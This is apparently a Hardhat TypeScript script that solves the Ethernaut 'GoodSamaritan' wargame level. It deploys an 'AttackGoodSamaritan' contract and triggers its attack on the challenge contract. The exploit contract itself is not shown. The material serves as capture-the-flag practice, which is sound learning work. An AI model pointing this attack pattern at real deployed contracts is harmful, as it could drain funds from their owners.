import { AbiCoder } from "@ethersproject/abi";
import { Wallet } from "ethers";
import { ethers } from "hardhat";
import { waitForDebugger } from "inspector";

const attackGoodSamaritan = async () => {
    // change contract addresses here.
    const goodSamaritanAddress = process.env.GOODSAMARITAN!; //type "await contract.address()" in ethernaut console
    const player = process.env.PLAYER; //place your player address here (you may type player in ethernaut console)
    const args: any[] = [];
    const deployer = process.env.PRIVATE_KEY || "";
    // [deployer] = await ethers.getSigners();

    // Don't touch below 🚀
    // Vulnerability from
    // additional read:
    // https://blog.soliditylang.org/2021/04/21/custom-errors/
    // https://docs.openzeppelin.com/contracts/3.x/extending-contracts#rules_of_hooks
    // typing all commands in console below
    // type contract.abi in ethernaut to expose all ABI (change this only if there was an update in ethernaut and this is no longer the same)

    // deploying attack contract here
    // const deployed = await deployContract(hre, "AttackGoodSamaritan", args);
    // alternative below
    console.log("Deploying attack contract AttackGoodSamaritan...");
    const attack = await (
        await ethers.getContractFactory("AttackGoodSamaritan", deployer)
    ).deploy();
    console.log(attack);
    console.log(`Attack contract deployed to ${attack.address}`);
    // experimantal verify below
    // if (attackGoodSamaritan.address){
    //     console.log("Verifying contract...");
    //     try {
    //         await run("verify:verify", {
    //             address: attackGoodSamaritan.address,
    //             constructorArguments: args,
    //         });
    //     } catch (e: any) {
    //         if (e.message.toLowerCase().includes("already verified")) {
    //             console.log("Already verified!");
    //         } else {
    //             console.log(e);
    //         }
    //     }
    // }

    const contract = await ethers.getContractAt("GoodSamaritan", goodSamaritanAddress);
    const coinAddress = await contract.coin();
    console.log("Coin address is: ", coinAddress);
    const walletAddress = await contract.wallet();
    console.log("Wallet Address is: ", walletAddress);
    // const walletBalance = await coinAddress. //TODO balance checks
    console.log("Sending attack using player's contract...");
    const tx = await attack.attack(goodSamaritanAddress);
    const txReceipt = await tx.wait();
    console.log(txReceipt);
    // TODO: add checks for balances
};

attackGoodSamaritan()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
